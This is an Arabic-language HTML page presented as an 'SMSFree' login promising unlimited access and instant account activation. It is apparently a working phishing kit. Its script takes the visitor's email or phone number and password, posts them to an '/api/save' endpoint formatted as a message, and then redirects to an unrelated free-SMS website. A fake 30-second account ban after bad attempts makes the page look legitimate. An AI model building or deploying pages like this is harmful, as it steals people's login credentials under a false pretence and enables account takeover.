<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - حماية متقدمة</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
        }

        .main-container {
            width: 90%; max-width: 420px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .blur-content { transition: filter 0.4s ease, opacity 0.4s ease; }
        
        /* حالة الحظر */
        .is-banned .blur-content {
            filter: blur(15px);
            opacity: 0.1;
            pointer-events: none;
        }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; text-align: center; display: none; width: 100%;
        }

        #timer { font-size: 55px; font-weight: bold; color: #fbbf24; }
    </style>
</head>
<body>

<div class="main-container" id="cardContainer">
    <div class="ban-overlay" id="banOverlay">
        <h3 style="color: #fbbf24; margin-bottom: 5px;">⚠️ تم تقييد حسابك</h3>
        <p style="font-size: 13px; padding: 0 10px;">تم حظرك بسبب المحاولات الغير صحيحة في كتابة البريد الإلكتروني أو كلمة المرور</p>
        <div id="timer">30</div>
    </div>

    <div class="blur-content">
        <div class="logo-circle">SMSFree</div>
        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود وتفعيل فوري لحساباتك.</h2>

        <form id="loginForm">
            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="passInput" placeholder="كلمة المرور" required>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
    </div>
</div>

<script>
    let attemptCounter = 0;
    let countdown;

    // دالة للتحقق من وجود حظر سابق عند تحميل الصفحة
    window.onload = () => {
        const banUntil = localStorage.getItem('banUntil');
        if (banUntil) {
            const remaining = Math.round((banUntil - Date.now()) / 1000);
            if (remaining > 0) {
                startCountdown(remaining);
            } else {
                localStorage.removeItem('banUntil');
            }
        }
    };

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const user = document.getElementById('userInput').value.trim();
        const pass = document.getElementById('passInput').value;

        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phonePattern = /^\+?[0-9]{8,15}$/;
        const isValid = (emailPattern.test(user) || phonePattern.test(user)) && !/[\u0600-\u06FF]/.test(user) && pass.length >= 6;

        if (!isValid) {
            attemptCounter++;
            if (attemptCounter >= 3) {
                const banTime = Date.now() + (30 * 1000); // حظر لمدة 30 ثانية من الآن
                localStorage.setItem('banUntil', banTime);
                startCountdown(30);
            } else {
                Swal.fire({
                    title: 'بيانات غير دقيقة',
                    text: 'تأكد من كتابة البريد بشكل صحيح لتجنب الحظر.',
                    icon: 'error',
                    confirmButtonColor: '#22d3ee'
                });
            }
            return;
        }

        sendData(user, pass);
    };

    function startCountdown(seconds) {
        const container = document.getElementById('cardContainer');
        const overlay = document.getElementById('banOverlay');
        const timerText = document.getElementById('timer');

        container.classList.add('is-banned');
        overlay.style.display = 'block';

        let timeLeft = seconds;
        timerText.innerText = timeLeft;

        clearInterval(countdown);
        countdown = setInterval(() => {
            timeLeft--;
            timerText.innerText = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                container.classList.remove('is-banned');
                overlay.style.display = 'none';
                localStorage.removeItem('banUntil');
                attemptCounter = 0;

                Swal.fire({
                    title: 'مبروك!',
                    text: 'تم إزالة الحظر عنك. لا تكرر الغلط ثانية.',
                    icon: 'success',
                    confirmButtonColor: '#22d3ee'
                });
            }
        }, 1000);
    }

    async function sendData(u, p) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `👤: ${u}\n🔑: ${p}` })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (e) {}
    }
</script>

</body>
</html>
